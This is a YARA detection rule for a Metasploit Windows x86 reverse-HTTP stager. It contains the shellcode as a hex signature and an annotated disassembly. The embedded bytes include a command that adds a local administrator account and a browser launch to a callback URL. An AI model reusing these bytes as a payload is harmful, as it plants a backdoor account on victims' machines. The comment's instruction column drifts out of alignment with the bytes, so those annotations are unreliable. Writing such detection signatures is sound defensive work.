
    rule stager_reverse_http___start0___x86
    {
        meta:
            desc = "Metasploit::windows::x86::stager_reverse_http::__start0__"
    
        /*
            FC                   | .                    | cld
            E8A5000000           | .....                | call 0xab
            53                   | S                    | push ebx
            6F                   | o                    | outsd
            660F847300           | f..s.                | o16 jz 0x82
            0000                 | ..                   | popa
            61                   | a                    | jc 0x73
            0F825D000000         | ..]...               | pop esp
            5C                   | \                    | dec ebp
            4D                   | M                    | imul esp,[ebx+0x72],dword 0x666f736f
            6963726F736F66       | icrosof              | jz 0x75
            0F8450000000         | ..P...               | push edi
            57                   | W                    | imul ebp,[esi+0x64],dword 0x5c73776f
            696E646F77735C       | indows\              | inc ebx
            43                   | C                    | jnz 0x96
            0F8562000000         | ..b...               | jc 0x8b
            0F8251000000         | ..Q...               | outsb
            6E                   | n                    | jz 0x7f
            0F843E000000         | ..>...               | gs jc 0x9f
            650F8257000000       | e..W...              | imul ebp,[edi+0x6e],dword 0x746e495c
            696F6E5C496E74       | ion\Int              | gs jc 0xa4
            650F824E000000       | e..N...              | gs jz 0x59
            650F84FCFFFFFF       | e......              | push ebx
            53                   | S                    | gs jz 0xb1
            650F844C000000       | e..L...              | imul ebp,[esi+0x67],dword 0x6f5a5c73
            696E67735C5A6F       | ings\Zo              | outsb
            6E                   | n                    | gs jnc 0xa4
            650F8330000000       | e..0...              | xor eax,[eax]
            3300                 | 3.                   | xor [eax],esi
            3130                 | 10                   | xor [ecx+esi],dh
            303431               | 041                  | xor dh,[eax]
            3230                 | 20                   | xor [ecx],dh
            3031                 | 01                   | xor dh,[eax]
            3230                 | 20                   | xor [ecx],esi
            3131                 | 11                   | xor [eax],dh
            3030                 | 00                   | xor [ebx+0x3a],eax
            31433A               | 1C:                  | pop esp
            5C                   | \                    | jo 0xd1
            0F8042000000         | ..B...               | outsd
            6F                   | o                    | a16 jc 0xc4
            670F822D000000       | g..-...              | jng 0x96
            0F8EF9FFFFFF         | ......               | pop esp
            5C                   | \                    | imul ebp,[esi+0x74],dword 0x7e6e7265
            696E7465726E7E       | intern~              | xor [ecx+ebp*2+0x65],ebx
            315C6965             | 1\ie                 | js 0xe3
            0F8834000000         | ..4...               | insb
            6C                   | l                    | outsd
            6F                   | o                    | jc 0xdc
            0F8225000000         | ..%...               | and [0x2077656e],ch
            202D6E657720         |  -new                | push dword 0x3a707474
            687474703A           | http:                | das
            2F                   | /                    | das
            2F                   | /                    | cmp bh,[eax]
            3A38                 | :8                   | xor [eax],bh
            3038                 | 08                   | xor [edi],ch
            302F                 | 0/                   | inc ecx
            41                   | A                    | outsb
            6E                   | n                    | inc ecx
            41                   | A                    | xor [edi+0x31],cl
            304F31               | 0O1                  | dec ecx
            49                   | I                    | dec edi
            4F                   | O                    | outsd
            6F                   | o                    | push byte +0x68
            6A68                 | jh                   | push ebx
            53                   | S                    | push byte +0x62
            6A62                 | jb                   | cmp [edx+0x43],esi
            397243               | 9rC                  | a16 js 0x115
            670F8833000000       | g..3...              | jno 0xd6
            0F81EEFFFFFF         | ......               | cmp [ecx],esi
            3931                 | 91                   | insd
            6D                   | m                    | inc esp
            44                   | D                    | jnz 0x10d
            0F851B000000         | ......               | pop edx
            5A                   | Z                    | outsb
            6E                   | n                    | jno 0xf4
            0F81FAFFFFFF         | ......               | add al,ch
            00E8                 | ..                   | dec esi
            4E                   | N                    | add [eax],al
            0000                 | ..                   | add [eax-0x75],ah
            00608B               | .`.                  | insb
            6C                   | l                    | and al,0x24
            2424                 | $$                   | mov eax,[ebp+0x3c]
            8B453C               | .E<                  | mov edi,[ebp+eax+0x78]
            8B7C0578             | .|.x                 | add edi,ebp
            01EF                 | ..                   | mov ecx,[edi+0x18]
            8B4F18               | .O.                  | mov ebx,[edi+0x20]
            8B5F20               | ._                   | add ebx,ebp
            01EB                 | ..                   | jecxz 0xfa
            E3E2                 | ..                   | dec ecx
            49                   | I                    | mov esi,[ebx+ecx*4]
            8B348B               | .4.                  | add esi,ebp
            01EE                 | ..                   | xor eax,eax
            31C0                 | 1.                   | cdq
            99                   | .                    | lodsb
            AC                   | .                    | test al,al
            84C0                 | ..                   | jz 0xdd
            0F84B3FFFFFF         | ......               | ror edx,0xd
            C1CA0D               | ...                  | add edx,eax
            01C2                 | ..                   | jmp short 0xd1
            EBA0                 | ..                   | cmp edx,[esp+0x28]
            3B542428             | ;T$(                 | jnz 0xc6
            0F858BFFFFFF         | ......               | mov ebx,[edi+0x24]
            8B5F24               | ._$                  | add ebx,ebp
            01EB                 | ..                   | mov cx,[ebx+ecx*2]
            668B0C4B             | f..K                 | mov ebx,[edi+0x1c]
            8B5F1C               | ._.                  | add ebx,ebp
            01EB                 | ..                   | mov eax,[ebx+ecx*4]
            8B048B               | ...                  | add eax,ebp
            01E8                 | ..                   | mov [esp+0x1c],eax
            8944241C             | .D$.                 | popa
            61                   | a                    | ret 0x8
            C20800               | ...                  | pop edi
            5F                   | _                    | pop ebx
            5B                   | [                    | xor edx,edx
            31D2                 | 1.                   | mov eax,[fs:edx+0x30]
            648B4230             | d.B0                 | test eax,eax
            85C0                 | ..                   | js 0x116
            0F88B0FFFFFF         | ......               | mov eax,[eax+0xc]
            8B400C               | .@.                  | mov esi,[eax+0x1c]
            8B701C               | .p.                  | lodsd
            AD                   | .                    | mov eax,[eax+0x8]
            8B4008               | .@.                  | jmp short 0x11f
            EBAD                 | ..                   | mov eax,[eax+0x34]
            8B4034               | .@4                  | add eax,byte +0x7c
            83C07C               | ..|                  | mov eax,[eax+0x3c]
            8B403C               | .@<                  | mov ebp,esp
            89E5                 | ..                   | push dword 0x5f048af0
            68F08A045F           | h..._                | push eax
            50                   | P                    | push dword 0x16b3fe72
            6872FEB316           | hr...                | push eax
            50                   | P                    | push dword 0xec0e4e8e
            688E4E0EEC           | h.N..                | push eax
            50                   | P                    | call edi
            FFD7                 | ..                   | xchg eax,esi
            96                   | .                    | call edi
            FFD7                 | ..                   | mov [ebp+0x0],eax
            894500               | .E.                  | call edi
            FFD7                 | ..                   | mov [ebp+0x4],eax
            894504               | .E.                  | push edx
            52                   | R                    | push dword 0x32336970
            6870693332           | hpi32                | push dword 0x61766461
            6861647661           | hadva                | push esp
            54                   | T                    | call esi
            FFD6                 | ..                   | push dword 0x2922ba9
            68A92B9202           | h.+..                | push eax
            50                   | P                    | push dword 0x2d1c9add
            68DD9A1C2D           | h...-                | push eax
            50                   | P                    | call edi
            FFD7                 | ..                   | mov [ebp+0x8],eax
            894508               | .E.                  | call edi
            FFD7                 | ..                   | xchg eax,edi
            97                   | .                    | xchg esi,ebx
            87F3                 | ..                   | push esp
            54                   | T                    | push esi
            56                   | V                    | push dword 0x80000001
            6801000080           | h....                | call edi
            FFD7                 | ..                   | pop ebx
            5B                   | [                    | add esi,byte +0x44
            83C644               | ..D                  | push eax
            50                   | P                    | mov edi,esp
            89E7                 | ..                   | cmp byte [esi],0x43
            803E43               | .>C                  | jz 0x194
            0F84BBFFFFFF         | ......               | push eax
            50                   | P                    | lodsd
            AD                   | .                    | push eax
            50                   | P                    | mov eax,esp
            89E0                 | ..                   | push byte +0x4
            6A04                 | j.                   | push edi
            57                   | W                    | push byte +0x4
            6A04                 | j.                   | push byte +0x0
            6A00                 | j.                   | push eax
            50                   | P                    | push ebx
            53                   | S                    | call near [ebp+0x8]
            FF5508               | .U.                  | jmp short 0x174
            EB88                 | ..                   | mov cl,[0x7ffe0030]
            8A0D3000FE7F         | ..0...               | mov [esi],cl
            880E                 | ..                   | push byte +0x54
            6A54                 | jT                   | pop ecx
            59                   | Y                    | sub esp,ecx
            29CC                 | ).                   | mov edi,esp
            89E7                 | ..                   | push edi
            57                   | W                    | rep stosb
            F3AA                 | ..                   | pop edi
            5F                   | _                    | mov byte [edi],0x44
            C60744               | ..D                  | inc byte [edi+0x2c]
            FE472C               | .G,                  | inc byte [edi+0x2d]
            FE472D               | .G-                  | push dword 0x746c75
            68756C7400           | hult.                | push dword 0x61666544
            6844656661           | hDefa                | push dword 0x5c306174
            687461305C           | hta0\                | push dword 0x536e6957
            6857696E53           | hWinS                | mov [edi+0x8],esp
            896708               | .g.                  | lea ebx,[edi+0x44]
            8D5F44               | ._D                  | push ebx
            53                   | S                    | push edi
            57                   | W                    | push eax
            50                   | P                    | push eax
            50                   | P                    | push byte +0x10
            6A10                 | j.                   | push eax
            50                   | P                    | push eax
            50                   | P                    | push eax
            50                   | P                    | push esi
            56                   | V                    | push eax
            50                   | P                    | call near [ebp+0x0]
            FF5500               | .U.                  | call near [ebp+0x4]
            FF5504               | .U.                  | arpl [ebp+0x64],bp
            636D64               | cmd                  | gs js 0x23f
            650F8802000000       | e......              | and [edi],ch
            202F                 |  /                   | arpl [eax],sp
            6320                 | c                    | outsb
            6E                   | n                    | gs jz 0x202
            650F84B9FFFFFF       | e......              | jnz 0x257
            0F8508000000         | ......               | gs jc 0x207
            650F82B1FFFFFF       | e......              | insd
            6D                   | m                    | gs jz 0x24c
            650F84EEFFFFFF       | e......              | jnc 0x25d
            0F83F9FFFFFF         | ......               | insb
            6C                   | l                    | outsd
            6F                   | o                    | imul esi,[eax+0x20],dword 0x4444412f
            6970202F414444       | ip /ADD              | and [esi],ah
            2026                 |  &                   | and [es:esi+0x65],ch
            26206E65             | & ne                 | jz 0x21f
            0F84A6FFFFFF         | ......               | insb
            6C                   | l                    | outsd
            6F                   | o                    | arpl [ecx+0x6c],sp
            63616C               | cal                  | a16 jc 0x276
            670F82F1FFFFFF       | g......              | jnz 0x279
            0F85EEFFFFFF         | ......               | and [ecx+0x64],al
            204164               |  Ad                  | insd
            6D                   | m                    | imul ebp,[esi+0x69],dword 0x61727473
            696E6973747261       | inistra              | jz 0x285
            0F84E9FFFFFF         | ......               | jc 0x28b
            0F82E9FFFFFF         | ......               | and [ebp+0x65],ch
            206D65               |  me                  | jz 0x27e
            0F84D3FFFFFF         | ......               | jnc 0x28f
            0F83DEFFFFFF         | ......               | insb
            6C                   | l                    | outsd
            6F                   | o                    | imul esi,[eax+0x2f],dword 0x444441
        */
    
        strings:
            $a   = { fc e8 a5 00 00 00 53 6f 66 0f 84 73 00 00 00 61 0f 82 5d 00 00 00 5c 4d 69 63 72 6f 73 6f 66 0f 84 50 00 00 00 57 69 6e 64 6f 77 73 5c 43 0f 85 62 00 00 00 0f 82 51 00 00 00 6e 0f 84 3e 00 00 00 65 0f 82 57 00 00 00 69 6f 6e 5c 49 6e 74 65 0f 82 4e 00 00 00 65 0f 84 fc ff ff ff 53 65 0f 84 4c 00 00 00 69 6e 67 73 5c 5a 6f 6e 65 0f 83 30 00 00 00 33 00 31 30 30 34 31 32 30 30 31 32 30 31 31 30 30 31 43 3a 5c 0f 80 42 00 00 00 6f 67 0f 82 2d 00 00 00 0f 8e f9 ff ff ff 5c 69 6e 74 65 72 6e 7e 31 5c 69 65 0f 88 34 00 00 00 6c 6f 0f 82 25 00 00 00 20 2d 6e 65 77 20 68 74 74 70 3a 2f 2f 3a 38 30 38 30 2f 41 6e 41 30 4f 31 49 4f 6f 6a 68 53 6a 62 39 72 43 67 0f 88 33 00 00 00 0f 81 ee ff ff ff 39 31 6d 44 0f 85 1b 00 00 00 5a 6e 0f 81 fa ff ff ff 00 e8 4e 00 00 00 60 8b 6c 24 24 8b 45 3c 8b 7c 05 78 01 ef 8b 4f 18 8b 5f 20 01 eb e3 e2 49 8b 34 8b 01 ee 31 c0 99 ac 84 c0 0f 84 b3 ff ff ff c1 ca 0d 01 c2 eb a0 3b 54 24 28 0f 85 8b ff ff ff 8b 5f 24 01 eb 66 8b 0c 4b 8b 5f 1c 01 eb 8b 04 8b 01 e8 89 44 24 1c 61 c2 08 00 5f 5b 31 d2 64 8b 42 30 85 c0 0f 88 b0 ff ff ff 8b 40 0c 8b 70 1c ad 8b 40 08 eb ad 8b 40 34 83 c0 7c 8b 40 3c 89 e5 68 f0 8a 04 5f 50 68 72 fe b3 16 50 68 8e 4e 0e ec 50 ff d7 96 ff d7 89 45 00 ff d7 89 45 04 52 68 70 69 33 32 68 61 64 76 61 54 ff d6 68 a9 2b 92 02 50 68 dd 9a 1c 2d 50 ff d7 89 45 08 ff d7 97 87 f3 54 56 68 01 00 00 80 ff d7 5b 83 c6 44 50 89 e7 80 3e 43 0f 84 bb ff ff ff 50 ad 50 89 e0 6a 04 57 6a 04 6a 00 50 53 ff 55 08 eb 88 8a 0d 30 00 fe 7f 88 0e 6a 54 59 29 cc 89 e7 57 f3 aa 5f c6 07 44 fe 47 2c fe 47 2d 68 75 6c 74 00 68 44 65 66 61 68 74 61 30 5c 68 57 69 6e 53 89 67 08 8d 5f 44 53 57 50 50 6a 10 50 50 50 56 50 ff 55 00 ff 55 04 63 6d 64 65 0f 88 02 00 00 00 20 2f 63 20 6e 65 0f 84 b9 ff ff ff 0f 85 08 00 00 00 65 0f 82 b1 ff ff ff 6d 65 0f 84 ee ff ff ff 0f 83 f9 ff ff ff 6c 6f 69 70 20 2f 41 44 44 20 26 26 20 6e 65 0f 84 a6 ff ff ff 6c 6f 63 61 6c 67 0f 82 f1 ff ff ff 0f 85 ee ff ff ff 20 41 64 6d 69 6e 69 73 74 72 61 0f 84 e9 ff ff ff 0f 82 e9 ff ff ff 20 6d 65 0f 84 d3 ff ff ff 0f 83 de ff ff ff 6c 6f }
    
        condition:
            any of them
    }
    
    